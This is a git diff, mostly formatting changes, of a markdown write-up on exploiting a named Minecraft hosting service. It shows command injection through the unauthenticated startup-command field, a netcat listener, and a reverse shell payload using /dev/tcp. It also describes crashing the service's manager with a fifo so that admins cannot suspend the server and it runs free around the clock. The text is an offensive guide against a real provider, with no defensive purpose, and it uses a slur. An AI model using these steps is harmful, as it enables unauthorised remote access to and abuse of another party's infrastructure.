@@ -32,7 +32,7 @@ Which basically control everything on your server.
 
 Every POST/GET Request to your server is managed with `minecraft-manager`.
 
-`minecraft-manager` is hosted on the VM itself. 
+`minecraft-manager` is hosted on the VM itself.
 
 So If we find a way to crash `minecraft-manager` they wouldn't be able to suspended our server from their admin panel.
 
@@ -49,11 +49,13 @@ Every server has it's own manager subdomain in a form of
 ```
 [serverID].manager.minehut.com
 ```
+
 Here is an Example:
 
 ![Img](https://i.imgur.com/2juofzG.png)
 
 Now, They have a path to get your startup flags.
+
 ```
 /v1/game/start_cmd
 ```
@@ -63,9 +65,11 @@ Like this:
 ![Img](https://i.imgur.com/v0Leg1j.png)
 
 This is so fucking retarded because you can legit just RCE it with
+
 ```
 $(bash -c 'command here')
 ```
+
 Also, This does not require any authentications what so ever.
 
 But how do you modified start_cmd?
@@ -75,6 +79,7 @@ You can directly modified start_cmd from their panel.
 I will be using Seed as an example
 
 Firstly, I will start a netcat server on port 25565 with command
+
 ```
 nc -lvnp 25565
 ```
@@ -82,6 +87,7 @@ nc -lvnp 25565
 ![Img](https://i.imgur.com/4sVVh0z.png)
 
 Then I will go to the panel. And input
+
 ```
 $(bash -c 'sh -i >& /dev/tcp/IP Address/PORT 0>&1')
 ```
@@ -108,11 +114,12 @@ Do it as your own risk.
 
 #### 3. Getting 24/7 on free server.
 
-Before doing this. I recommend you having a shell plugin and luckperms with * permission on default group.
+Before doing this. I recommend you having a shell plugin and luckperms with \* permission on default group.
 
 This will make your account completely bricked.
 
 After you have shell access. You can make an fifo with
+
 ```
 mkfifo whatevername
 ```
@@ -126,6 +133,7 @@ After a few hours, The API to your server will be timed out.
 The panel will stop working and showing no results.
 
 And when you visit
+
 ```
 api.minehut.com/server/Servername?byName=true
 ```
